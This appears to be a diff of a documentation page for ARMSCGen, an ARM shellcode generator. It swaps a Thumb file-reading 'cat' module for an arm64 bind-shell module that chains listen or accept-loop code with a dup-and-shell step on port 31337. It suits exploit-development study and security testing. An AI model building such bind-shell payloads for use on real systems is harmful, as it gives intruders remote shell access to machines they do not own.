@@ -6,7 +6,7 @@
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     
-    <title>shellcodes.thumb.cat &mdash; ARMSCGen  documentation</title>
+    <title>shellcodes.arm64.bindshell &mdash; ARMSCGen  documentation</title>
     
     <link rel="stylesheet" href="../../../_static/default.css" type="text/css" />
     <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
@@ -46,25 +46,36 @@
         <div class="bodywrapper">
           <div class="body">
             
-  <h1>Source code for shellcodes.thumb.cat</h1><div class="highlight"><pre>
-<span class="kn">import</span> <span class="nn">open_file</span>
-<span class="kn">import</span> <span class="nn">sendfile</span>
+  <h1>Source code for shellcodes.arm64.bindshell</h1><div class="highlight"><pre>
+<span class="kn">import</span> <span class="nn">listen</span>
+<span class="kn">import</span> <span class="nn">acceptloop</span>
+<span class="kn">import</span> <span class="nn">dupsh</span>
+<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="k">def</span> <span class="nf">generate</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="n">in_fd</span><span class="o">=</span><span class="s">&#39;auto&#39;</span><span class="p">,</span> <span class="n">out_fd</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
-<div class="viewcode-block" id="generate"><a class="viewcode-back" href="../../../shellcodes.thumb.html#shellcodes.thumb.cat.generate">[docs]</a>    <span class="sd">&quot;&quot;&quot;cat a file like UNIX Command</span>
+<div class="viewcode-block" id="generate"><a class="viewcode-back" href="../../../shellcodes.arm64.html#shellcodes.arm64.bindshell.generate">[docs]</a><span class="k">def</span> <span class="nf">generate</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">31337</span><span class="p">,</span> <span class="n">sock</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">once</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;bind shell on specific port</span>
 
-<span class="sd">    Args: </span>
-<span class="sd">        filepath (str)  : target file name</span>
-<span class="sd">        in_fd  (int/str): in  file descriptor (default: &#39;r6&#39; indicates a file descriptor)</span>
-<span class="sd">        out_fd (int/str): out file descriptor (default: 4)</span>
+<span class="sd">    Args:</span>
+<span class="sd">        port(int): specific port</span>
+<span class="sd">        </span>
+<span class="sd">        sock(int/str/reg): connection sock will be mapped with shell</span>
+<span class="sd">        </span>
+<span class="sd">        once(boolean): binds on port infinity if true</span>
+<span class="sd">                       binds on port once if false </span>
 <span class="sd">    &quot;&quot;&quot;</span>
-    <span class="n">sc</span>  <span class="o">=</span> <span class="n">open_file</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">in_fd</span> <span class="o">==</span> <span class="s">&#39;auto&#39;</span><span class="p">:</span>
-        <span class="n">sc</span> <span class="o">+=</span> <span class="n">sendfile</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="s">&#39;r6&#39;</span><span class="p">,</span> <span class="n">out_fd</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">once</span><span class="p">:</span>
+        <span class="n">sc</span> <span class="o">=</span> <span class="n">listen</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">sc</span> <span class="o">+=</span> <span class="n">sendfile</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">in_fd</span><span class="p">,</span> <span class="n">out_fd</span><span class="p">)</span>
+        <span class="n">sc</span> <span class="o">=</span> <span class="n">acceptloop</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
+
+    <span class="n">sc</span> <span class="o">+=</span> <span class="n">dupsh</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
+
     <span class="k">return</span> <span class="n">sc</span>
-</pre></div></div>
+</div>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">print</span> <span class="n">generate</span><span class="p">()</span>
+</pre></div>
 
           </div>
         </div>
